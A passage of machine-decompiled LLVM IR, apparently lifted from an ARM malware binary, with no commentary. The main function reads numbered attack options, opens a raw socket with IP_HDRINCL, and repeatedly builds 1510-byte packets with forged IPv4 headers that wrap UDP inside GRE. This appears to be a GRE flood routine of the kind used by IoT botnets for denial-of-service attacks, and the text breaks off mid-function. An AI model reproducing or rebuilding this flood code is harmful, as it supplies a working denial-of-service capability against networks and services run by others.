  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 19, 18, 20, 21, 22, 23, 25, 24, 29, 26, 27, 28, 32, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_bd28, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_bc24, { 1, 0 }
  uselistorder label %dec_label_pc_bb48, { 1, 0 }
  uselistorder label %dec_label_pc_bae4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ba54.preheader, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %.thread22, { 2, 1, 0 }
}

define i32 @function_bd64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bd64:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_bd64 = load i32, i32* @r4, align 4
  %v6_bd64 = load i32, i32* @r5, align 4
  %v9_bd64 = load i32, i32* @r6, align 4
  %v12_bd64 = load i32, i32* @r7, align 4
  %v15_bd64 = load i32, i32* @r8, align 4
  %v1_bd68 = urem i32 %arg1, 256
  store i32 %v1_bd68, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_bd68, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_bd80 = urem i32 %arg3, 256
  store i32 %v1_bd80, i32* @r4, align 4
  %v2_bd84 = call i32 @_calloc(i32 %v1_bd68, i32 4)
  %v0_bd88 = load i32, i32* @r5, align 4
  store i32 %v0_bd88, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bd98 = load i32, i32* @r4, align 4
  store i32 %v0_bd98, i32* %r0.global-to-local, align 4
  %v5_bd9c = inttoptr i32 %v0_bd88 to i32*
  %v6_bd9c = call i32 @function_b240(i32 %v0_bd98, i32* %v5_bd9c, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 %v0_bdb4, i32* %r1.global-to-local, align 4
  %v0_bdb8 = load i32, i32* @r4, align 4
  store i32 %v0_bdb8, i32* %r0.global-to-local, align 4
  %v5_bdbc = trunc i32 %v6_bd9c to i8
  %v6_bdc0 = inttoptr i32 %v0_bdb4 to i32*
  %v7_bdc0 = call i32 @function_b240(i32 %v0_bdb8, i32* %v6_bdc0, i32 3, i32 65535)
  %v0_bdc4 = load i32, i32* @r5, align 4
  store i32 %v0_bdc4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdc0, i32* @r7, align 4
  %v0_bdd4 = load i32, i32* @r4, align 4
  store i32 %v0_bdd4, i32* %r0.global-to-local, align 4
  %v4_bdd8 = inttoptr i32 %v0_bdc4 to i32*
  %v5_bdd8 = call i32 @function_b240(i32 %v0_bdd4, i32* %v4_bdd8, i32 4, i32 64)
  %v0_bde4 = load i32, i32* @r5, align 4
  store i32 %v0_bde4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bdf0 = load i32, i32* @r4, align 4
  store i32 %v0_bdf0, i32* %r0.global-to-local, align 4
  %v5_bdf4 = trunc i32 %v5_bdd8 to i8
  %v6_bdf8 = inttoptr i32 %v0_bde4 to i32*
  %v7_bdf8 = call i32 @function_b240(i32 %v0_bdf0, i32* %v6_bdf8, i32 5, i32 1)
  %v1_be04 = urem i32 %v7_bdf8, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 %v0_be10, i32* %r1.global-to-local, align 4
  %v0_be14 = load i32, i32* @r4, align 4
  store i32 %v0_be14, i32* %r0.global-to-local, align 4
  %v5_be1c = inttoptr i32 %v0_be10 to i32*
  %v6_be1c = call i32 @function_b240(i32 %v0_be14, i32* %v5_be1c, i32 6, i32 65535)
  %v0_be24 = load i32, i32* @r5, align 4
  store i32 %v0_be24, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_be1c, i32* @sl, align 4
  %v0_be34 = load i32, i32* @r4, align 4
  store i32 %v0_be34, i32* %r0.global-to-local, align 4
  %v4_be38 = inttoptr i32 %v0_be24 to i32*
  %v5_be38 = call i32 @function_b240(i32 %v0_be34, i32* %v4_be38, i32 7, i32 65535)
  %v0_be3c = load i32, i32* @r5, align 4
  store i32 %v0_be3c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_be38, i32* @r8, align 4
  %v0_be4c = load i32, i32* @r4, align 4
  store i32 %v0_be4c, i32* %r0.global-to-local, align 4
  %v4_be50 = inttoptr i32 %v0_be3c to i32*
  %v5_be50 = call i32 @function_b240(i32 %v0_be4c, i32* %v4_be50, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_be60 = load i32, i32* @r5, align 4
  store i32 %v0_be60, i32* %r1.global-to-local, align 4
  %v0_be64 = load i32, i32* @r4, align 4
  store i32 %v0_be64, i32* %r0.global-to-local, align 4
  %v4_be68 = inttoptr i32 %v0_be60 to i32*
  %v5_be68 = call i32 @function_b240(i32 %v0_be64, i32* %v4_be68, i32 1, i32 1)
  %v1_be70 = urem i32 %v5_be68, 256
  %v0_be74 = load i32, i32* @r5, align 4
  store i32 %v0_be74, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be80 = load i32, i32* @r4, align 4
  store i32 %v0_be80, i32* %r0.global-to-local, align 4
  %v5_be88 = inttoptr i32 %v0_be74 to i32*
  %v6_be88 = call i32 @function_b240(i32 %v0_be80, i32* %v5_be88, i32 19, i32 0)
  %v0_be90 = load i32, i32* @r5, align 4
  store i32 %v0_be90, i32* %r1.global-to-local, align 4
  %v2_be94 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_be94, i32* %r3.global-to-local, align 4
  store i32 %v6_be88, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bea0 = load i32, i32* @r4, align 4
  store i32 %v0_bea0, i32* %r0.global-to-local, align 4
  %v4_bea4 = inttoptr i32 %v0_be90 to i32*
  %v5_bea4 = call i32 @function_b240(i32 %v0_bea0, i32* %v4_bea4, i32 25, i32 %v2_be94)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_beb8 = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_beb8, i32* %r0.global-to-local, align 4
  %v7_bebc = icmp eq i32 %v3_beb8, -1
  store i1 %v7_bebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bebc, label %dec_label_pc_c33c, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bd64
  store i32 1, i32* %stack_var_-40, align 4
  %v6_bed0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_bed0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bee4 = call i32 @_setsockopt()
  store i32 %v0_bee4, i32* %r0.global-to-local, align 4
  %v7_bee8 = icmp eq i32 %v0_bee4, -1
  store i1 %v7_bee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bee8, label %dec_label_pc_c334, label %dec_label_pc_bef0

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bec8
  %v0_bef0 = load i32, i32* @sl, align 4
  %v0_befc = load i32, i32* @r8, align 4
  %v3_befc = mul i32 %v0_befc, 65536
  store i32 %v3_befc, i32* %r8.global-to-local, align 4
  %v0_bf00 = load i32, i32* @r7, align 4
  %v3_bf00 = mul i32 %v0_bf00, 65536
  store i32 %v3_bf00, i32* %r7.global-to-local, align 4
  %v0_bf04 = load i32, i32* @r6, align 4
  %v1_bf04 = urem i32 %v0_bf04, 256
  store i32 %v1_bf04, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_bf0c = urem i32 %v0_bef0, 65536
  store i32 %v3_bf0c, i32* %r2.global-to-local, align 4
  %v3_bf10 = urem i32 %v0_befc, 65536
  store i32 %v3_bf10, i32* %r3.global-to-local, align 4
  %v0_bf14 = load i32, i32* @fp, align 4
  %v2_bf14 = icmp eq i32 %v0_bf14, 0
  store i1 %v2_bf14, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_bf24 = urem i32 %v0_bf00, 65536
  store i32 %v3_bf24, i32* @sl, align 4
  %tmp85 = icmp slt i32 %v0_bf14, 1
  br i1 %tmp85, label %dec_label_pc_c460, label %dec_label_pc_bf34

dec_label_pc_bf34:                                ; preds = %dec_label_pc_bef0
  %v3_bf38 = mul i32 %v5_be50, 65536
  %v1_bf3c = add i32 %v3_bf38, 3407872
  %v3_bf44 = udiv i32 %v1_bf3c, 256
  %v0_bf00.not = or i32 %v0_bf00, -65536
  %v1_bf54 = xor i32 %v0_bf00.not, 65535
  %v1_bf58 = urem i32 %v0_befc, 256
  %tmp86 = mul nsw i32 %v1_bf54, 256
  %v1_bf70 = and i32 %v3_bf44, 65280
  %v1_bf74 = add i32 %v3_bf38, 524288
  %v4_bf78 = udiv i32 %v1_bf3c, 16777216
  %v5_bf78 = or i32 %v1_bf70, %v4_bf78
  store i32 %v5_bf78, i32* %r0.global-to-local, align 4
  %v1_bf7c = add i32 %v3_bf38, 1835008
  %v1_bf84 = and i32 %tmp86, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  store i32 %v1_bf84, i32* %lr.global-to-local, align 4
  %tmp87 = udiv i32 %v1_bf54, 256
  %tmp88 = udiv i32 %v0_bf00, 256
  %v5_bf98 = trunc i32 %tmp87 to i8
  %tmp89 = udiv i32 %v0_bef0, 256
  %sext30 = mul i32 %tmp88, 16777216
  %v4_bfb8 = sdiv i32 %sext30, 16777216
  %v3_bfc4 = mul nuw nsw i32 %v1_bf58, 256
  store i32 %v3_bfc4, i32* %r5.global-to-local, align 4
  %v3_bfc8 = udiv i32 %v1_bf74, 256
  %tmp90 = udiv i32 %v0_befc, 256
  %v4_bfd0 = urem i32 %tmp90, 256
  %v5_bfd0 = or i32 %v4_bfd0, %v3_bfc4
  store i32 %v5_bfd0, i32* %r7.global-to-local, align 4
  %v3_bfd4 = ashr i32 %sext30, 31
  %v3_bfe0 = sdiv i32 %v1_bf7c, 16777216
  %v1_bfe4 = and i32 %v3_bfc8, 65280
  store i32 %v1_bfe4, i32* %r6.global-to-local, align 4
  %sext31 = mul i32 %tmp89, 16777216
  %v4_bfec = sdiv i32 %sext31, 16777216
  %v3_bff0 = ashr i32 %v1_bf7c, 31
  %v3_bff4 = udiv i32 %v1_bf54, 65536
  %v4_bff8 = udiv i32 %v1_bf74, 16777216
  %v5_bff8 = or i32 %v1_bfe4, %v4_bff8
  store i32 %v5_bff8, i32* %r8.global-to-local, align 4
  %v3_c004 = ashr i32 %sext31, 31
  store i32 %v3_c004, i32* %r1.global-to-local, align 4
  store i32 %v1_bf58, i32* %r2.global-to-local, align 4
  %v3_c00c42 = udiv i32 %v1_bfe4, 256
  store i32 %v3_c00c42, i32* %r3.global-to-local, align 4
  %v5_c014 = trunc i32 %v3_c004 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_c070 = sext i8 %v5_bdf4 to i32
  %sext = mul i32 %v1_bf3c, 256
  %v4_c078 = sdiv i32 %sext, 16777216
  %sext17 = mul nuw i32 %v4_bf78, 16777216
  %v4_c088 = sdiv i32 %sext17, 16777216
  %v2_c15c = icmp eq i32 %v1_bf04, 0
  %sext21 = mul i32 %v1_bf74, 256
  %v4_c17c = sdiv i32 %sext21, 16777216
  %sext22 = mul i32 %v0_befc, 16777216
  %v7_c194 = sdiv i32 %sext22, 16777216
  %v1_c084 = trunc i32 %v4_c078 to i8
  br label %dec_label_pc_c024

dec_label_pc_c024:                                ; preds = %bb97, %dec_label_pc_bf34
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_c030 = call i32 @_calloc(i32 1510, i32 4)
  store i32 %v2_c030, i32* %r0.global-to-local, align 4
  store i32 %v2_bd84, i32* %r1.global-to-local, align 4
  %v3_c038 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c038, i32* %r3.global-to-local, align 4
  %v2_c03c = load i32, i32* %r4.global-to-local, align 4
  %v5_c03c = mul i32 %v2_c03c, 4
  %v6_c03c = add i32 %v5_c03c, %v2_bd84
  %v7_c03c = inttoptr i32 %v6_c03c to i32*
  store i32 %v2_c030, i32* %v7_c03c, align 4
  %v0_c040 = load i32, i32* %r1.global-to-local, align 4
  %v1_c040 = load i32, i32* %r3.global-to-local, align 4
  %v4_c040 = mul i32 %v1_c040, 4
  %v5_c040 = add i32 %v4_c040, %v0_c040
  %v6_c040 = inttoptr i32 %v5_c040 to i32*
  %v7_c040 = load i32, i32* %v6_c040, align 4
  store i32 %v7_c040, i32* %r4.global-to-local, align 4
  %v1_c044 = inttoptr i32 %v7_c040 to i8*
  %v2_c044 = load i8, i8* %v1_c044, align 1
  %tmp = urem i8 %v2_c044, 16
  %v1_c048 = zext i8 %tmp to i32
  %v1_c04c = or i32 %v1_c048, 64
  store i32 %v1_c04c, i32* %r2.global-to-local, align 4
  %v1_c050 = trunc i32 %v1_c04c to i8
  store i8 %v1_c050, i8* %v1_c044, align 1
  %v0_c054 = load i32, i32* %r4.global-to-local, align 4
  %v1_c054 = inttoptr i32 %v0_c054 to i8*
  %v2_c054 = load i8, i8* %v1_c054, align 1
  %v1_c058 = and i8 %v2_c054, -16
  %v1_c05c = or i8 %v1_c058, 5
  store i32 %v1_be04, i32* %r2.global-to-local, align 4
  store i8 %v1_c05c, i8* %v1_c054, align 1
  %v2_c06c = load i32, i32* %r4.global-to-local, align 4
  %v3_c06c = add i32 %v2_c06c, 1
  %v4_c06c = inttoptr i32 %v3_c06c to i8*
  store i8 %v5_bdbc, i8* %v4_c06c, align 1
  store i32 %v4_c070, i32* %r1.global-to-local, align 4
  %v2_c074 = load i32, i32* %r4.global-to-local, align 4
  %v3_c074 = add i32 %v2_c074, 8
  %v4_c074 = inttoptr i32 %v3_c074 to i8*
  store i8 %v5_bdf4, i8* %v4_c074, align 1
  store i32 %v4_c078, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %r2.global-to-local, align 4
  %v9_c080 = icmp eq i32 %v0_c080, 0
  store i1 %v9_c080, i1* %cpsr_z.global-to-local, align 1
  %v2_c084 = load i32, i32* %r4.global-to-local, align 4
  %v3_c084 = add i32 %v2_c084, 3
  %v4_c084 = inttoptr i32 %v3_c084 to i8*
  store i8 %v1_c084, i8* %v4_c084, align 1
  store i32 %v4_c088, i32* %r2.global-to-local, align 4
  %v0_c08c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c08c, label %.thread24, label %.thread

.thread:                                          ; preds = %dec_label_pc_c024
  %v1_c08c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_c08c, i32* %r3.global-to-local, align 4
  %v2_c090 = trunc i32 %v1_c08c to i8
  %v3_c090 = load i32, i32* %r4.global-to-local, align 4
  %v4_c090 = add i32 %v3_c090, 7
  %v5_c090 = inttoptr i32 %v4_c090 to i8*
  store i8 %v2_c090, i8* %v5_c090, align 1
  %v0_c094.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c094.pr.pr, label %.thread24, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* %r4.global-to-local, align 4
  %v4_c098 = add i32 %v3_c098, 6
  %v5_c098 = inttoptr i32 %v4_c098 to i8*
  store i8 64, i8* %v5_c098, align 1
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_c024, %.thread, %bb
  %v0_c09c = load i32, i32* %r2.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i8
  %v2_c09c = load i32, i32* %r4.global-to-local, align 4
  %v3_c09c = add i32 %v2_c09c, 2
  %v4_c09c = inttoptr i32 %v3_c09c to i8*
  store i8 %v1_c09c, i8* %v4_c09c, align 1
  store i32 %v3_bfd4, i32* %r2.global-to-local, align 4
  store i32 %v4_bfb8, i32* %r1.global-to-local, align 4
  %v2_c0ac = load i32, i32* %r4.global-to-local, align 4
  %v3_c0ac = add i32 %v2_c0ac, 9
  %v4_c0ac = inttoptr i32 %v3_c0ac to i8*
  store i8 47, i8* %v4_c0ac, align 1
  %v0_c0b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0b0 = trunc i32 %v0_c0b0 to i8
  %v2_c0b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c0b0 = add i32 %v2_c0b0, 5
  %v4_c0b0 = inttoptr i32 %v3_c0b0 to i8*
  store i8 %v1_c0b0, i8* %v4_c0b0, align 1
  %v3_c0b4 = load i32, i32* %stack_var_-40, align 4
  %v5_c0bc = mul i32 %v3_c0b4, 24
  store i32 %v5_c0bc, i32* %r3.global-to-local, align 4
  store i32 %v5_bea4, i32* %r2.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c0c4 = add i32 %v1_c0c4, 12
  %v3_c0c4 = inttoptr i32 %v2_c0c4 to i32*
  store i32 %v5_bea4, i32* %v3_c0c4, align 4
  %v0_c0c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0c8 = load i32, i32* @sb, align 4
  %v2_c0c8 = add i32 %v1_c0c8, %v0_c0c8
  store i32 %v2_c0c8, i32* %r3.global-to-local, align 4
  %v0_c0cc = load i32, i32* %r1.global-to-local, align 4
  %v1_c0cc = trunc i32 %v0_c0cc to i8
  %v2_c0cc = load i32, i32* %r4.global-to-local, align 4
  %v3_c0cc = add i32 %v2_c0cc, 4
  %v4_c0cc = inttoptr i32 %v3_c0cc to i8*
  store i8 %v1_c0cc, i8* %v4_c0cc, align 1
  %v0_c0d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0d0 = add i32 %v0_c0d0, 16
  %v2_c0d0 = inttoptr i32 %v1_c0d0 to i32*
  %v3_c0d0 = load i32, i32* %v2_c0d0, align 4
  store i32 %v3_c0d0, i32* %r2.global-to-local, align 4
  %v0_c0d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0d4 = add i32 %v0_c0d4, 20
  store i32 %v1_c0d4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_c0dc = load i32, i32* %r0.global-to-local, align 4
  %v1_c0dc = trunc i32 %v0_c0dc to i8
  %v3_c0dc = add i32 %v0_c0d4, 23
  %v4_c0dc = inttoptr i32 %v3_c0dc to i8*
  store i8 %v1_c0dc, i8* %v4_c0dc, align 1
  %v0_c0e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c0e0 = trunc i32 %v0_c0e0 to i8
  %v2_c0e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c0e0 = add i32 %v2_c0e0, 2
  %v4_c0e0 = inttoptr i32 %v3_c0e0 to i8*
  store i8 %v1_c0e0, i8* %v4_c0e0, align 1
  %v0_c0e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 24
  %v2_c0e4 = inttoptr i32 %v1_c0e4 to i8*
  %v3_c0e4 = load i8, i8* %v2_c0e4, align 1
  %tmp105 = urem i8 %v3_c0e4, 16
  %v1_c0e8 = zext i8 %tmp105 to i32
  %v1_c0ec = or i32 %v1_c0e8, 64
  store i32 %v1_c0ec, i32* %r3.global-to-local, align 4
  %v1_c0f0 = trunc i32 %v1_c0ec to i8
  store i8 %v1_c0f0, i8* %v2_c0e4, align 1
  %v0_c0f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c0f4 = add i32 %v1_c0f4, 16
  %v3_c0f4 = inttoptr i32 %v2_c0f4 to i32*
  store i32 %v0_c0f4, i32* %v3_c0f4, align 4
  %v0_c0f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0f8 = add i32 %v0_c0f8, 24
  %v2_c0f8 = inttoptr i32 %v1_c0f8 to i8*
  %v3_c0f8 = load i8, i8* %v2_c0f8, align 1
  %v1_c0fc = and i8 %v3_c0f8, -16
  %v1_c100 = or i8 %v1_c0fc, 5
  store i8 %v1_c100, i8* %v2_c0f8, align 1
  %v0_c10c = load i32, i32* %r4.global-to-local, align 4
  %v1_c10c = add i32 %v0_c10c, 24
  store i32 %v1_c10c, i32* %r5.global-to-local, align 4
  %v3_c110 = add i32 %v0_c10c, 25
  %v4_c110 = inttoptr i32 %v3_c110 to i8*
  store i8 %v5_bdbc, i8* %v4_c110, align 1
  store i32 %v3_bfe0, i32* %r1.global-to-local, align 4
  store i32 %tmp87, i32* %r3.global-to-local, align 4
  store i32 %v3_bff0, i32* %r2.global-to-local, align 4
  %v2_c120 = load i32, i32* %r5.global-to-local, align 4
  %v3_c120 = add i32 %v2_c120, 4
  %v4_c120 = inttoptr i32 %v3_c120 to i8*
  store i8 %v5_bf98, i8* %v4_c120, align 1
  %v0_c124 = load i32, i32* %r1.global-to-local, align 4
  %v1_c124 = trunc i32 %v0_c124 to i8
  %v2_c124 = load i32, i32* %r5.global-to-local, align 4
  %v3_c124 = add i32 %v2_c124, 2
  %v4_c124 = inttoptr i32 %v3_c124 to i8*
  store i8 %v1_c124, i8* %v4_c124, align 1
  %v0_c128 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c128, label %bb92, label %bb91

bb91:                                             ; preds = %.thread24
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread24, %bb91
  store i32 %v3_bff4, i32* %r1.global-to-local, align 4
  %v0_c130 = load i32, i32* %r2.global-to-local, align 4
  %v1_c130 = trunc i32 %v0_c130 to i8
  %v2_c130 = load i32, i32* %r5.global-to-local, align 4
  %v3_c130 = add i32 %v2_c130, 3
  %v4_c130 = inttoptr i32 %v3_c130 to i8*
  store i8 %v1_c130, i8* %v4_c130, align 1
  store i32 %v4_c070, i32* %r2.global-to-local, align 4
  %v0_c138 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c138, label %bb94, label %bb93

bb93:                                             ; preds = %bb92
  %v1_c138 = load i32, i32* %r3.global-to-local, align 4
  %v2_c138 = trunc i32 %v1_c138 to i8
  %v3_c138 = load i32, i32* %r5.global-to-local, align 4
  %v4_c138 = add i32 %v3_c138, 6
  %v5_c138 = inttoptr i32 %v4_c138 to i8*
  store i8 %v2_c138, i8* %v5_c138, align 1
  br label %bb94

bb94:                                             ; preds = %bb92, %bb93
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_c140 = load i32, i32* %r1.global-to-local, align 4
  %v1_c140 = trunc i32 %v0_c140 to i8
  %v2_c140 = load i32, i32* %r5.global-to-local, align 4
  %v3_c140 = add i32 %v2_c140, 5
  %v4_c140 = inttoptr i32 %v3_c140 to i8*
  store i8 %v1_c140, i8* %v4_c140, align 1
  %v0_c144 = load i32, i32* %r2.global-to-local, align 4
  %v1_c144 = trunc i32 %v0_c144 to i8
  %v2_c144 = load i32, i32* %r5.global-to-local, align 4
  %v3_c144 = add i32 %v2_c144, 8
  %v4_c144 = inttoptr i32 %v3_c144 to i8*
  store i8 %v1_c144, i8* %v4_c144, align 1
  %v0_c148 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c148, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_c148 = load i32, i32* %r0.global-to-local, align 4
  %v2_c148 = trunc i32 %v1_c148 to i8
  %v3_c148 = load i32, i32* %r5.global-to-local, align 4
  %v4_c148 = add i32 %v3_c148, 7
  %v5_c148 = inttoptr i32 %v4_c148 to i8*
  store i8 %v2_c148, i8* %v5_c148, align 1
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_c14c = load i32, i32* %r3.global-to-local, align 4
  %v1_c14c = trunc i32 %v0_c14c to i8
  %v2_c14c = load i32, i32* %r5.global-to-local, align 4
  %v3_c14c = add i32 %v2_c14c, 9
  %v4_c14c = inttoptr i32 %v3_c14c to i8*
  store i8 %v1_c14c, i8* %v4_c14c, align 1
  %v0_c150 = call i32 @function_10bd8()
  store i32 %v0_c150, i32* %r0.global-to-local, align 4
  store i32 %v1_bf04, i32* %r1.global-to-local, align 4
  store i1 %v2_c15c, i1* %cpsr_z.global-to-local, align 1
  %v1_c160 = sub i32 1023, %v0_c150
  store i32 %v1_c160, i32* %r3.global-to-local, align 4
  br i1 %v2_c15c, label %.thread25, label %.thread26

.thread25:                                        ; preds = %bb96
  %v2_c168 = load i32, i32* %r5.global-to-local, align 4
  %v3_c168 = add i32 %v2_c168, 16
  %v4_c168 = inttoptr i32 %v3_c168 to i32*
  store i32 %v1_c160, i32* %v4_c168, align 4
  br label %bb97

.thread26:                                        ; preds = %bb96
  %v1_c164 = load i32, i32* %r4.global-to-local, align 4
  %v2_c164 = add i32 %v1_c164, 16
  %v3_c164 = inttoptr i32 %v2_c164 to i32*
  %v4_c164 = load i32, i32* %v3_c164, align 4
  store i32 %v4_c164, i32* %r3.global-to-local, align 4
  %v2_c16c = load i32, i32* %r5.global-to-local, align 4
  %v3_c16c = add i32 %v2_c16c, 16
  %v4_c16c = inttoptr i32 %v3_c16c to i32*
  store i32 %v4_c164, i32* %v4_c16c, align 4
  br label %bb97

bb97:                                             ; preds = %.thread25, %.thread26
  store i32 %v4_bfec, i32* %r3.global-to-local, align 4
  %v0_c174 = load i32, i32* %r4.global-to-local, align 4
  %v1_c174 = add i32 %v0_c174, 44
  store i32 %v1_c174, i32* %r6.global-to-local, align 4
  %v1_c178 = load i32, i32* %r5.global-to-local, align 4
  %v2_c178 = add i32 %v1_c178, 12
  %v3_c178 = inttoptr i32 %v2_c178 to i32*
  store i32 %v0_c150, i32* %v3_c178, align 4
  store i32 %v4_c17c, i32* %r2.global-to-local, align 4
  %v0_c180 = load i32, i32* %r3.global-to-local, align 4
  %v1_c180 = trunc i32 %v0_c180 to i8
  %v2_c180 = load i32, i32* %r6.global-to-local, align 4
  %v3_c180 = inttoptr i32 %v2_c180 to i8*
  store i8 %v1_c180, i8* %v3_c180, align 1
  %v3_c184 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c184, i32* %r3.global-to-local, align 4
  %v0_c188 = load i32, i32* %r2.global-to-local, align 4
  %v1_c188 = trunc i32 %v0_c188 to i8
  %v2_c188 = load i32, i32* %r6.global-to-local, align 4
  %v3_c188 = add i32 %v2_c188, 5
  %v4_c188 = inttoptr i32 %v3_c188 to i8*
  store i8 %v1_c188, i8* %v4_c188, align 1
  %v0_c18c = load i32, i32* %r3.global-to-local, align 4
  %v1_c18c = add i32 %v0_c18c, 1
  store i32 %v1_c18c, i32* %r4.global-to-local, align 4
  store i32 %v3_c004, i32* %r1.global-to-local, align 4
  store i32 %v7_c194, i32* %r2.global-to-local, align 4
  %v1_c198 = load i32, i32* @fp, align 4
  %v9_c198 = icmp eq i32 %v1_c18c, %v1_c198
  store i1 %v9_c198, i1* %cpsr_z.global-to-local, align 1
  %v2_c19c = load i32, i32* %r6.global-to-local, align 4
  %v3_c19c = add i32 %v2_c19c, 1
  %v4_c19c = inttoptr i32 %v3_c19c to i8*
  store i8 %v5_c014, i8* %v4_c19c, align 1
  %v0_c1a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_c1a0 = trunc i32 %v0_c1a0 to i8
  %v2_c1a0 = load i32, i32* %r6.global-to-local, align 4
  %v3_c1a0 = add i32 %v2_c1a0, 2
  %v4_c1a0 = inttoptr i32 %v3_c1a0 to i8*
  store i8 %v1_c1a0, i8* %v4_c1a0, align 1
  %v0_c1a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c1a4 = trunc i32 %v0_c1a4 to i8
  %v2_c1a4 = load i32, i32* %r6.global-to-local, align 4
